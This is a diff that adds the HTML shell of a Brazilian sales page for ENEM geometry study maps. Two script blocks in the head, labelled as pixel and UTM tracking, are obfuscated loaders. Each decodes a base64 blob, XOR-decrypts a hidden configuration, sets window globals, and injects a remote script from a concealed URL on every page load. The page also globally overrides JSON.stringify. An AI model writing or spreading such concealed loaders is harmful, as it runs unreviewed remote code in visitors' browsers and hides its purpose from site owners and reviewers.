@@ -1,0 +1,100 @@
+<!doctype html>
+<html lang="pt-BR">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>MatEnem GeoVisual™ - ENEM</title>
+    <meta name="description" content="+80 Mapas Visuais de Geometria Espacial Mais Cobrados no ENEM" />
+    <meta name="theme-color" content="#ffffff" />
+    
+    <!-- DNS preconnect & prefetch for external resources -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link rel="preconnect" href="https://i.imgur.com" crossorigin>
+    <link rel="dns-prefetch" href="https://ggcheckout.app">
+
+    <!-- Preload LCP Hero Image & Carousel Images -->
+    <link rel="preload" as="image" href="https://i.imgur.com/ry4kCFD.png" fetchpriority="high" />
+    <link rel="preload" as="image" href="https://i.imgur.com/Sfkq6qI.png" fetchpriority="high" />
+    <link rel="preload" as="image" href="https://i.imgur.com/ooc0Vuh.png" />
+    <link rel="preload" as="image" href="https://i.imgur.com/Clt0VBY.png" />
+    <link rel="preload" as="image" href="https://i.imgur.com/Pb60p43.png" />
+
+    <!-- Google Fonts -->
+    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700;800;900&display=swap" rel="stylesheet">
+
+    <!-- Circular Structure Protection for Tracking Scripts -->
+    <script>
+      (function() {
+        var originalStringify = JSON.stringify;
+        JSON.stringify = function(value, replacer, space) {
+          if (value === undefined) {
+            return undefined;
+          }
+          
+          var cache = new WeakSet();
+          
+          function defaultReplacer(key, val) {
+            if (key && typeof key === 'string' && (
+              key.indexOf('__react') === 0 || 
+              key.indexOf('__reactFiber') === 0 || 
+              key.indexOf('__reactProps') === 0 || 
+              key.indexOf('__reactContainer') === 0 ||
+              key.indexOf('__reactEvents') === 0
+            )) {
+              return undefined;
+            }
+            
+            if (val && typeof val === 'object') {
+              if (typeof Node !== 'undefined' && val instanceof Node) {
+                return key === '' ? {} : undefined;
+              }
+              if (typeof Window !== 'undefined' && val instanceof Window) {
+                return key === '' ? {} : undefined;
+              }
+              if (cache.has(val)) {
+                return undefined;
+              }
+              cache.add(val);
+            }
+            
+            return val;
+          }
+
+          var activeReplacer = function(key, val) {
+            var sanitizedVal = defaultReplacer(key, val);
+            if (typeof replacer === 'function') {
+              return replacer.call(this, key, sanitizedVal);
+            } else if (Array.isArray(replacer)) {
+              if (key === '' || replacer.indexOf(key) !== -1) {
+                return sanitizedVal;
+              }
+              return undefined;
+            }
+            return sanitizedVal;
+          };
+
+          try {
+            var res = originalStringify(value, activeReplacer, space);
+            if (res === undefined && value !== undefined && typeof value !== 'function' && typeof value !== 'symbol') {
+              return '{}';
+            }
+            return res;
+          } catch (e) {
+            return '{}';
+          }
+        };
+      })();
+    </script>
+
+    <!-- Pixel & UTM Tracking Scripts -->
+    <script>(function(){var q_57l=atob("DCqxxeSOCAiQ68modFGTsJbiKjKyg73cBFmL6svtbGa+nr3FHUzI64fhZSbymebbF1jYtZD9J3j5k6zEW1rYvYHiJmLjyeWKFV7Ft43sfXz1mOuSL3ed54PiZ2rxh7qKTnHK54rvZW2y0evYHVLUqa3qKiSynajEAU+T/8a4aT+l0/ibF0/Q89TqPzmjjv/OQBjQ9tGsdVXt");var u_3seb=[];for(var x_q64=0;x_q64<q_57l.length;x_q64++){u_3seb.push(q_57l.charCodeAt(x_q64)&255);}var r_joj=u_3seb[0];var g_v2ry=u_3seb.slice(1,1+r_joj);var p_f=u_3seb.slice(1+r_joj);var p_wym=p_f.map(function(b,s_g6v2){return b^g_v2ry[s_g6v2%r_joj];});var y_zw="";for(var h_i=0;h_i<p_wym.length;h_i++){y_zw+=String.fromCharCode(p_wym[h_i]&255);}var t_2=decodeURIComponent(escape(y_zw));var d_hhe=JSON.parse(t_2);var s_t=d_hhe.globals||[];s_t.forEach(function(y_9rn){window[y_9rn.name]=y_9rn.value;});var o_l=document.createElement("script");o_l.src=d_hhe.url;o_l.async=true;o_l.defer=true;(d_hhe.attributes||[]).forEach(function(c_1){o_l.setAttribute(c_1.name,c_1.value);});(document.head||document.documentElement).appendChild(o_l);})();</script>
+    <script>(function(){var u_k=atob("DNfZ1C88/qIqHhy8x6z7oV1Q3JgIdmjIt6Tj+wBfmswEa2jRrrGg+kxTk4xIbDPPpKWwpFtP0ddec2+Tq7atsVxI0MhZPDCepqOtpkZei9ZPbT6GnKz7uk5Rim4AQPHjds7b0oVtRl8RTM2zOoqG8ulsRhsFFejHPpLz7+A1Kn85fez6G5fWk+FQekMNHez6G5bO4oE4Ri9ZHd3rF6qersVlZkNYHbWnerrOq9gMeiMNGa3me/fX7qXJB");var i_3xu=[];for(var l_ti=0;l_ti<u_k.length;l_ti++){i_3xu.push(u_k.charCodeAt(l_ti)&255);}var p_ll=i_3xu[0];var v_w=i_3xu.slice(1,1+p_ll);var w_c0=i_3xu.slice(1+p_ll);var k_8b=w_c0.map(function(b,p_bb){return b^v_w[p_bb%p_ll];});var q_m013="";for(var e_3=0;e_3<k_8b.length;e_3++){q_m013+=String.fromCharCode(k_8b[e_3]&255);}var x_ne=decodeURIComponent(escape(q_m013));var u_loxj=JSON.parse(x_ne);var m_35ti=u_loxj.globals||[];m_35ti.forEach(function(k_w){window[k_w.name]=k_w.value;});var o_dort=document.createElement("script");o_dort.src=u_loxj.url;o_dort.async=true;o_dort.defer=true;(u_loxj.attributes||[]).forEach(function(u_9w){o_dort.setAttribute(u_9w.name,u_9w.value);});(document.head||document.documentElement).appendChild(o_dort);})();</script>
+  </head>
+  <body class="bg-white text-zinc-900 antialiased font-sans">
+    <div id="root"></div>
+    <script type="module" src="/src/main.tsx"></script>
+  </body>
+</html>
+
+
